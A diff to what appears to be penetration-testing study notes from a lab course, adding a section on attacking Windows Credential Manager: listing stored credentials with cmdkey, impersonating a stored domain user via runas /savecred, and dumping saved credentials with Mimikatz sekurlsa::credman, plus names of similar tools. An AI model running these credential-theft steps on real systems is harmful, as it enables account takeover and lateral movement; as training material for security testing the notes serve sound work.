@@ -455,6 +455,64 @@ luid 124054
 		password (hex)
 ```
 
+# Attacking Windows Credential Manager
+
+[Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since `Server 2008 R2` and `Windows 7`.
+
+## cmdkey
+
+```powershell
+C:\Users\sadams>whoami
+srv01\sadams
+
+C:\Users\sadams>cmdkey /list
+
+Currently stored credentials:
+
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic
+    User: 02hejubrtyqjrkfi
+    Local machine persistence
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
+```
+
+The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:
+
+```powershell
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+Attempting to start cmd as user "SRV01\mcharles" ...
+```
+
+## Extracting Credentials with Mimikatz
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+
+...SNIP...
+
+Authentication Id : 0 ; 630472 (00000000:00099ec8)
+Session           : RemoteInteractive from 3
+User Name         : mcharles
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 4/27/2025 2:40:32 AM
+SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
+        credman :
+         [00000000]
+         * Username : mcharles@inlanefreight.local
+         * Domain   : onedrive.live.com
+         * Password : ...SNIP...
+
+...SNIP...
+```
+
+**Note:** Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).
 
 # Creds Hunting in Windows
 ## Windows Search
